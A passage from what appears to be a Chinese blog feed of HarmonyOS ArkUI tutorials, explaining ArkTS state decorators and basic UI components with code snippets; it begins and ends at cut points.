嵌套类型以及数组中的对象属性无法触发视图更新</td></tr><tr><td>初始化方式</td><td>不允许子组件初始化</td><td>父组件传递，禁止子组件初始化</td></tr></tbody></table><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entry</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">PropPage</span> &#123;</span><br><span class="line"><span class="meta">@State</span> <span class="attr">totalTask</span>: <span class="built_in">number</span> = <span class="number">0</span> <span class="comment">//父组件创建的变量</span></span><br><span class="line"><span class="title class_">Task</span>(&#123;<span class="attr">totalTask</span>: <span class="variable language_">this</span>.<span class="property">totalTask</span>&#125;) <span class="comment">//将变量传递到子组件</span></span><br><span class="line"><span class="title class_">TaskList</span>(&#123;<span class="attr">totalTask</span>: $totalTask&#125;) <span class="comment">//@Link需要传递的是引用，而不是值，所以需要用$美元符号</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">Task</span> &#123;</span><br><span class="line"><span class="meta">@Prop</span> <span class="attr">totalTask</span>: <span class="built_in">number</span> <span class="comment">//子组件不允许初始化</span></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">//@Link用法类似，@Link则是双向同步刷新</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">TaskList</span> &#123;</span><br><span class="line"><span class="meta">@Link</span> <span class="attr">totalTask</span>: <span class="built_in">number</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Provide-Consume"><a href="#Provide-Consume" class="headerlink" title="@Provide &amp; @Consume"></a>@Provide &amp; @Consume</h1><ul><li>@Provide和@Consume可以跨组件提供类似于@State和@Link的双向同步<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240112151444.png" alt="image.png"><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Entry</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">PropPage</span> &#123;</span><br><span class="line"><span class="meta">@Provide</span> <span class="attr">totalTask</span>: <span class="built_in">number</span> = <span class="number">0</span> <span class="comment">//父组件创建的变量</span></span><br><span class="line"><span class="title class_">Task</span>() <span class="comment">//不需要传递参数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">Task</span> &#123;</span><br><span class="line"><span class="meta">@Consume</span> <span class="attr">totalTask</span>: <span class="built_in">number</span> <span class="comment">//子组件不允许初始化</span></span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li><li>但是性能损耗也比较大，无需跨组件时尽量使用@Prop和@Link</li></ul><h1 id="Observed-ObjectLink"><a href="#Observed-ObjectLink" class="headerlink" title="@Observed &amp; @ObjectLink"></a>@Observed &amp; @ObjectLink</h1><ul><li>@ObjectLink和@Observed装饰器用于在涉及嵌套对象或数组元素为对象的场景中进行双向数据同步</li><li>解决嵌套对象里的对象属性变更无法刷新和数组里边的元素对象属性无法刷新的问题</li><li>解决方法：</li></ul><ol><li>给对象添加@Observed装饰器</li><li>同时给嵌套的对象加上@ObjectLink装饰器</li><li>一般情况需要将它作为参数传给一个组件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Observed</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Task</span>&#123; <span class="comment">//创建的对象</span></span><br><span class="line"><span class="keyword">static</span> <span class="attr">id</span>: <span class="built_in">number</span> = <span class="number">1</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Entry</span></span><br><span class="line"><span class="comment">//主页面部分</span></span><br><span class="line"><span class="meta">@State</span> <span class="attr">task</span>: <span class="title class_">Task</span>[] = []</span><br><span class="line"><span class="title function_">handleTaskChange</span>(<span class="params"></span>)&#123;  </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">totalTask</span> = <span class="variable language_">this</span>.<span class="property">tasks</span>.<span class="property">length</span>  </span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">finishTask</span> = <span class="variable language_">this</span>.<span class="property">tasks</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">finished</span>).<span class="property">length</span>  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="title class_">TaskItem</span>(&#123;<span class="attr">item</span>:item, <span class="attr">onTaskChange</span>: <span class="variable language_">this</span>.<span class="property">handleTaskChange</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)&#125;) <span class="comment">//传递时this会缺失，所以用bind传递this</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">TaskItem</span> &#123;</span><br><span class="line"><span class="meta">@ObjectLink</span> <span class="attr">item</span>: <span class="title class_">Task</span></span><br><span class="line"><span class="attr">onTaskChange</span>: <span class="function">() =&gt;</span> <span class="built_in">void</span> <span class="comment">//当子组件需要使用父组件的函数，可以传进来</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 鸿蒙应用开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> harmonyos </tag>
            
            <tag> ArkUI </tag>
            
            <tag> ArkTS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>鸿蒙HarmonyOS 4-ArkUI组件</title>
      <link href="/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%BB%84%E4%BB%B6/"/>
      <url>/2024/01/11/%E9%B8%BF%E8%92%99HarmonyOS%204-ArkUI%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Image：图片显示组件"><a href="#Image：图片显示组件" class="headerlink" title="Image：图片显示组件"></a>Image：图片显示组件</h1><ol><li>声明Image组件并设置图片源：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Image</span>(<span class="attr">src</span>: <span class="built_in">string</span>|<span class="title class_">PixelMap</span>|<span class="title class_">Resource</span>)</span><br></pre></td></tr></table></figure></li></ol><ul><li>string格式，通常用来加载网络图片，需要申请网络访问权限：ohos.permission.INTERNET<br><code>Image(&#39;https://xxx.png&#39;)</code><br>需要网络权限，在module.json5配置文件中声明权限。<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;requestPermissions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  </span><br><span class="line">  <span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ohos.permission.INTERNET&quot;</span>  </span><br><span class="line">  <span class="punctuation">&#125;</span>  </span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure></li><li>PixelMap格式，可以加载像素图，通常用在图片编辑中<br><code>Image(pixelMapObject)</code></li><li>Resource格式，加载本地图片，推荐使用<br><code>Image($r(&#39;app.media.xxx&#39;)</code><br><code>Image($rawfile(&#39;xxx.png&#39;))</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111150401.png" alt="image.png"></li></ul><ol start="2"><li>添加图片属性<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Image</span>($r(<span class="string">&#x27;app.media.icon&#x27;</span>))</span><br><span class="line">.<span class="title function_">width</span>(<span class="number">100</span>) <span class="comment">//宽度</span></span><br><span class="line">.<span class="title function_">height</span>(<span class="number">120</span>) <span class="comment">//高度</span></span><br><span class="line">.<span class="title function_">borderRadius</span>(<span class="number">10</span>) <span class="comment">//边框圆角</span></span><br><span class="line">.<span class="title function_">interpolation</span>(<span class="title class_">ImageInterpolation</span>.<span class="property">High</span>) <span class="comment">//图片插值</span></span><br></pre></td></tr></table></figure>图片插值可以让图片锯齿变小</li></ol><h1 id="Text：文本显示组件"><a href="#Text：文本显示组件" class="headerlink" title="Text：文本显示组件"></a>Text：文本显示组件</h1><ol><li>声明Text组件并设置文本内容<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Text</span>(content?:<span class="built_in">string</span>|<span class="title class_">Resource</span>)</span><br></pre></td></tr></table></figure></li></ol><ul><li>string格式，直接填写文本内容<br><code>Text(&#39;图片宽度&#39;)</code></li><li>Resource格式，读取本地资源文件<br><code>Text($r(&#39;app.string.width_label&#39;))</code><br>可以实现显示不同国家语言<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111152201.png" alt="image.png"><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span>  </span><br><span class="line">  <span class="attr">&quot;string&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>  </span><br><span class="line">    <span class="punctuation">&#123;</span>  </span><br><span class="line">      <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;width_label&quot;</span><span class="punctuation">,</span>  </span><br><span class="line">      <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;图片宽度：&quot;</span>  </span><br><span class="line">    <span class="punctuation">&#125;</span>  </span><br><span class="line">  <span class="punctuation">]</span>  </span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>添加文本属性<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Text</span>(<span class="string">&#x27;注册账号&#x27;</span>)</span><br><span class="line">.<span class="title function_">lineHeight</span>(<span class="number">32</span>) <span class="comment">//行高</span></span><br><span class="line">.<span class="title function_">fontSize</span>(<span class="number">20</span>) <span class="comment">//字体大小</span></span><br><span class="line">.<span class="title function_">fontColor</span>(<span class="string">&#x27;#ff1876f8&#x27;</span>) <span class="comment">//字体颜色</span></span><br><span class="line">.<span class="title function_">fontWeight</span>(<span class="title class_">FontWeight</span>.<span class="property">Medium</span>) <span class="comment">//字体粗细</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="TextInput：文本输入框"><a href="#TextInput：文本输入框" class="headerlink" title="TextInput：文本输入框"></a>TextInput：文本输入框</h1><ol><li>声明TextInput组件：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">TextInput</span>( &#123;placeholder?: <span class="title class_">ResourceStr</span>, text?: <span class="title class_">ResourceStr</span>&#125;)</span><br></pre></td></tr></table></figure></li></ol><ul><li>placeHoler：输入框提示文本<br><code>TextInput(&#123;placeholer: &#39;请输入手机号&#39;&#125;)</code></li><li>text：输入框默认的文本内容<br><code>TextInput(&#123;text: &#39;xxx&#39;&#125;)</code><br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111153551.png" alt="image.png"></li></ul><ol start="2"><li>添加属性和事件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">TextInput</span>(&#123;<span class="attr">text</span>: <span class="string">&#x27;当前输入文本&#x27;</span>&#125;)</span><br><span class="line">.<span class="title function_">width</span>(<span class="number">150</span>) <span class="comment">//宽</span></span><br><span class="line">.<span class="title function_">height</span>(<span class="number">30</span>) <span class="comment">//高</span></span><br><span class="line">.<span class="title function_">backgroundColor</span>(<span class="string">&#x27;#FFF&#x27;</span>) <span class="comment">//背景色</span></span><br><span class="line">.<span class="title function_">type</span>(<span class="title class_">InputType</span>.<span class="property">Password</span>) <span class="comment">//输入框类型，密码输入框</span></span><br><span class="line">.<span class="title function_">onChange</span>(<span class="function"><span class="params">value</span> =&gt;</span> &#123; <span class="comment">//事件处理</span></span><br><span class="line"><span class="comment">//value是用户输入的文本内容</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111154025.png" alt="image.png"></li></ol><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Normal</td><td>基本输入模式</td></tr><tr><td>Password</td><td>密码输入模式</td></tr><tr><td>Email</td><td>邮箱地址输入模式</td></tr><tr><td>Number</td><td>纯数字输入模式</td></tr><tr><td>PhoneNumber</td><td>电话号码输入模式</td></tr></tbody></table><h1 id="Button：按钮组件"><a href="#Button：按钮组件" class="headerlink" title="Button：按钮组件"></a>Button：按钮组件</h1><ol><li>声明Button组件，label是按钮文字：<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Button</span>(label?: <span class="title class_">ResourceStr</span>)</span><br></pre></td></tr></table></figure></li></ol><ul><li>文字型按钮<br><code>Button(&#39;点击&#39;)</code></li><li>自定义按钮，在button内嵌套其他组件<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111155135.png" alt="image.png"></li></ul><ol start="2"><li>添加属性和事件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Button</span>(<span class="string">&#x27;点击&#x27;</span>)</span><br><span class="line">.<span class="title function_">width</span>(<span class="number">100</span>)</span><br><span class="line">.<span class="title function_">height</span>(<span class="number">30</span>)</span><br><span class="line">.<span class="title function_">type</span>(<span class="title class_">ButtonType</span>.<span class="property">Normal</span>)</span><br><span class="line">.<span class="title function_">onClick</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//处理点击事件</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>Capsule</td><td>胶囊型按钮</td></tr><tr><td>Circle</td><td>圆形按钮</td></tr><tr><td>Normal</td><td>普通按钮</td></tr></tbody></table><h1 id="Slider：滑动条组件"><a href="#Slider：滑动条组件" class="headerlink" title="Slider：滑动条组件"></a>Slider：滑动条组件</h1><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Silder</span>(options?: <span class="title class_">SliderOptions</span>)</span><br></pre></td></tr></table></figure><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111155751.png" alt="image.png"></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Slider</span>(&#123;  </span><br><span class="line">  <span class="attr">min</span>: <span class="number">10</span>,  <span class="comment">//最小值</span></span><br><span class="line">  <span class="attr">max</span>: <span class="number">360</span>,  <span class="comment">//最大值</span></span><br><span class="line">  <span class="attr">value</span>: <span class="variable language_">this</span>.<span class="property">imageWidth</span>,  <span class="comment">//当前值</span></span><br><span class="line">  <span class="attr">step</span>: <span class="number">10</span>,  <span class="comment">//滑动步长</span></span><br><span class="line">  <span class="attr">style</span>: <span class="title class_">SliderStyle</span>.<span class="property">InSet</span>,  <span class="comment">//样式InSet按钮在条里面，OutSet则在外面</span></span><br><span class="line">  <span class="attr">direction</span>: <span class="title class_">Axis</span>.<span class="property">Horizontal</span>, <span class="comment">//Horizontal为水平，vertical为垂直</span></span><br><span class="line">  <span class="attr">reverse</span>: <span class="literal">false</span> <span class="comment">//是否反向滑动</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">width</span>(<span class="number">300</span>)  </span><br><span class="line">.<span class="title function_">showTips</span>(<span class="literal">true</span>) <span class="comment">//是否展示value值百分比</span></span><br><span class="line">.<span class="title function_">blockColor</span>(<span class="string">&#x27;#36D&#x27;</span>)  <span class="comment">//滑块颜色</span></span><br><span class="line">.<span class="title function_">onChange</span>(<span class="function"><span class="params">value</span> =&gt;</span>&#123;  </span><br><span class="line"><span class="variable language_">this</span>.<span class="property">imageWidth</span> = value  <span class="comment">//value为当前滑块值</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h1 id="Column-Row：线性布局组件"><a href="#Column-Row：线性布局组件" class="headerlink" title="Column &amp; Row：线性布局组件"></a>Column &amp; Row：线性布局组件</h1><ul><li>Column为<strong>纵向</strong>布局，Row为<strong>横向</strong>布局<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Column</span>(&#123;<span class="attr">space</span>: <span class="number">20</span>&#125;)&#123;</span><br><span class="line"><span class="title class_">Text</span>(<span class="string">&#x27;123&#x27;</span>)</span><br><span class="line"><span class="title class_">Text</span>(<span class="string">&#x27;ABC&#x27;</span>)</span><br><span class="line"><span class="title class_">Text</span>(<span class="string">&#x27;XYZ&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">.<span class="title function_">height</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">.<span class="title function_">padding</span>(<span class="number">20</span>)</span><br><span class="line">.<span class="title function_">justifyContent</span>(<span class="title class_">FlexAlign</span>.<span class="property">Center</span>)</span><br><span class="line">.<span class="title function_">alignItems</span>(<span class="title class_">HorizontalAlign</span>.<span class="property">Center</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>justifyContent：设置子元素在<strong>主轴方向</strong>的对齐格式<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111161840.png" alt="image.png"></li><li>alignItems：设置子元素在<strong>交叉轴方向</strong>的对齐格式<br><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111162021.png" alt="image.png"></li><li>padding：内边距，边框距离元素的距离<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Row</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">padding</span>(&#123;<span class="attr">left</span>: <span class="number">14</span>, <span class="attr">right</span>: <span class="number">14</span>&#125;) <span class="comment">//左右内边距</span></span><br></pre></td></tr></table></figure></li><li>margin：外边距<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Column</span>()&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">margin</span>(&#123;<span class="attr">top</span>: <span class="number">35</span>, <span class="attr">bottom</span>: <span class="number">35</span>&#125;) <span class="comment">//上下外边距</span></span><br></pre></td></tr></table></figure></li><li>Divider：分割线<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Divider</span>()</span><br><span class="line">.<span class="title function_">width</span>(<span class="string">&#x27;90%&#x27;</span>)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111185824.png" alt="image.png"></li><li>layoutWeight：权重分配，默认为0，则为原定的高度。如果为其他为0，这个元素为1，则除了另外元素的空间，全部分配给权重为1的元素。<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">row</span>(<span class="params"></span>)&#123;</span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">layourWeight</span>(<span class="number">1</span>) </span><br></pre></td></tr></table></figure></li><li>Blank：将剩余的空间撑满<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Row</span>()&#123;</span><br><span class="line"><span class="title class_">Image</span>(<span class="comment">/*返回图标*/</span>)</span><br><span class="line"><span class="title class_">Text</span>(<span class="string">&#x27;商品列表&#x27;</span>)</span><br><span class="line"><span class="title class_">Blank</span>()</span><br><span class="line"><span class="title class_">Image</span>(<span class="comment">/*刷新图标*/</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111194953.png" alt="image.png"></li></ul><h1 id="循环控制"><a href="#循环控制" class="headerlink" title="循环控制"></a>循环控制</h1><h2 id="ForEach"><a href="#ForEach" class="headerlink" title="ForEach"></a>ForEach</h2><ul><li>循环遍历数组，根据数组内容渲染页面组件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ForEach</span>(</span><br><span class="line"><span class="attr">arr</span>: <span class="title class_">Array</span>, <span class="comment">//要遍历的数据数组</span></span><br><span class="line"><span class="function">(<span class="params">item: <span class="built_in">any</span>, index?: <span class="built_in">number</span></span>) =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//页面组件生成函数</span></span><br><span class="line"><span class="title class_">Row</span>()&#123;</span><br><span class="line"><span class="title class_">Image</span>(item.<span class="property">image</span>)</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;,</span><br><span class="line">keyGenerator?: (<span class="attr">item</span>: <span class="built_in">any</span>, index?: <span class="built_in">number</span>): <span class="function"><span class="params">string</span> =&gt;</span> &#123;</span><br><span class="line"><span class="comment">//键生成函数，为数组每一项生成一个唯一标示，组件是否重新渲染的判断标准</span></span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240111191326.png" alt="image.png"></li></ul><h2 id="if-else"><a href="#if-else" class="headerlink" title="if &#x2F; else"></a>if &#x2F; else</h2><ul><li>条件控制，根据数据状态的不同，渲染不同的页面组件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="comment">/*判断条件*/</span>)&#123;</span><br><span class="line"><span class="comment">//内容</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//内容</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h1 id="List：列表组件"><a href="#List：列表组件" class="headerlink" title="List：列表组件"></a>List：列表组件</h1><ul><li><strong>列表</strong>（List）是一种复杂容器，具备下列特点：</li></ul><ol><li>列表项（ListItem）数量过多超出屏幕后，会自动提供滚动功能</li><li>列表项（ListItem）既可以纵向排列，也可以横向排列<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">List</span>(&#123;<span class="attr">space</span>: <span class="number">10</span>&#125;)&#123;</span><br><span class="line"><span class="title class_">ForEach</span>([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line"><span class="title class_">ListItem</span>()&#123;</span><br><span class="line"><span class="comment">//列表项内容，只能包含一个根组件</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">.<span class="title function_">width</span>(<span class="string">&#x27;100%&#x27;</span>)</span><br><span class="line">.<span class="title function_">listDirection</span>(<span class="title class_">Axis</span>.<span class="property">Vertical</span>) <span class="comment">//列表方向，默认纵向，横向为Horizontal</span></span><br></pre></td></tr></table></figure></li></ol><ul><li>space：和容器组件一样，表示列表项间距</li><li>ListItem：是一种标记，不是容器，只能包含一个根组件</li></ul><h1 id="自定义组件"><a href="#自定义组件" class="headerlink" title="自定义组件"></a>自定义组件</h1><ol><li>自定义组件<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Cpmponent</span></span><br><span class="line"><span class="keyword">export</span> struct <span class="title class_">Header</span> &#123;<span class="comment">//export用于在不同文件时导出</span></span><br><span class="line"><span class="keyword">private</span> <span class="attr">title</span>: <span class="title class_">ResourceStr</span> <span class="comment">//参数</span></span><br><span class="line"><span class="title function_">build</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="comment">//组件内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//可以直接使用</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Header</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;相对地址&#x27;</span> <span class="comment">//用于不同文件时的导入</span></span><br><span class="line"><span class="meta">@Entry</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line">struct <span class="title class_">Page</span> &#123;</span><br><span class="line"><span class="title function_">build</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="title class_">Header</span>(&#123;<span class="attr">title</span>: <span class="string">&#x27;主页&#x27;</span>&#125;) <span class="comment">//直接传入参数</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li>自定义构建函数<figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//全局构建函数</span></span><br><span class="line"><span class="meta">@Builder</span> <span class="keyword">function</span> <span class="title function_">ItemCard</span>(<span class="params">item: Item</span>)&#123;</span><br><span class="line"><span class="title class_">Row</span>(&#123;<span class="attr">space</span>: <span class="number">10</span>&#125;)&#123;</span><br><span class="line"><span class="comment">//组件内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line"><span class="title 